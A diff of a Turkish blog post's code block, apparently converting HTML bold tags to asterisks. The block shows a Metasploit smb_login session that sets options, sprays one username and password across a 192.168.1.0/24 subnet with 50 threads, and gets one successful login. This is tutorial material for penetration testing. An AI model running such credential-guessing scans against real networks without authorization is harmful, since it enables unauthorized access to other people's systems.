@@ -42,14 +42,14 @@ url: /tr/msf-icinde-smb-login-kontrolu/
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> use auxiliary/scanner/smb/smb_login
-msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> show options
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  use auxiliary/scanner/smb/smb_login
+msf auxiliary***(*** smb_login***)***  ***&gt;***  show options
 
-Module options <strong>(</strong>auxiliary/scanner/smb/smb_login<strong>)</strong>:
+Module options ***(*** auxiliary/scanner/smb/smb_login***)*** :
 
    Name              Current Setting  Required  Description
    ----              ---------------  --------  -----------
-   BLANK_PASSWORDS   true             no        Try blank passwords <strong>for </strong>all users
+   BLANK_PASSWORDS   true             no        Try blank passwords ***for *** all users
    BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
    PASS_FILE                          no        File containing passwords, one per line
    PRESERVE_DOMAINS  true             no        Respect a username that contains a domain name.
@@ -58,31 +58,31 @@ Module options <strong>(</strong>auxiliary/scanner/smb/smb_login<strong>)</stron
    SMBDomain         WORKGROUP        no        SMB Domain
    SMBPass                            no        SMB Password
    SMBUser                            no        SMB Username
-   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works <strong>for </strong>a host
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works ***for *** a host
    THREADS           1                yes       The number of concurrent threads
    USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
-   USER_AS_PASS      true             no        Try the username as the password <strong>for </strong>all users
+   USER_AS_PASS      true             no        Try the username as the password ***for *** all users
    USER_FILE                          no        File containing usernames, one per line
-   VERBOSE           true             yes       Whether to print output <strong>for </strong>all attempts
+   VERBOSE           true             yes       Whether to print output ***for *** all attempts
 
-msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> set RHOSTS 192.168.1.0/24
-RHOSTS <strong>=&gt;</strong> 192.168.1.0/24
-msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> set SMBUser victim
-SMBUser <strong>=&gt;</strong> victim
-msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> set SMBPass s3cr3t
-SMBPass <strong>=&gt;</strong> s3cr3t
-msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> set THREADS 50
-THREADS <strong>=&gt;</strong> 50
-msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong> run
+msf auxiliary***(*** smb_login***)***  ***&gt;***  set RHOSTS 192.168.1.0/24
+RHOSTS ***=&gt;***  192.168.1.0/24
+msf auxiliary***(*** smb_login***)***  ***&gt;***  set SMBUser victim
+SMBUser ***=&gt;***  victim
+msf auxiliary***(*** smb_login***)***  ***&gt;***  set SMBPass s3cr3t
+SMBPass ***=&gt;***  s3cr3t
+msf auxiliary***(*** smb_login***)***  ***&gt;***  set THREADS 50
+THREADS ***=&gt;***  50
+msf auxiliary***(*** smb_login***)***  ***&gt;***  run
 
-<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.100 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
-<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.111 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
-<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.114 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
-<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.125 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
-<strong>[</strong><strong>*</strong><strong>]</strong> 192.168.1.116 - SUCCESSFUL LOGIN <strong>(</strong>Unix<strong>)</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed
+***[*** ******* ***]***  192.168.1.100 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
+***[*** ******* ***]***  192.168.1.111 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
+***[*** ******* ***]***  192.168.1.114 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
+***[*** ******* ***]***  192.168.1.125 - FAILED 0xc000006d - STATUS_LOGON_FAILURE
+***[*** ******* ***]***  192.168.1.116 - SUCCESSFUL LOGIN ***(*** Unix***)*** 
+***[*** ******* ***]***  Auxiliary module execution completed
 
-msf auxiliary<strong>(</strong>smb_login<strong>)</strong> <strong>&gt;</strong>
+msf auxiliary***(*** smb_login***)***  ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
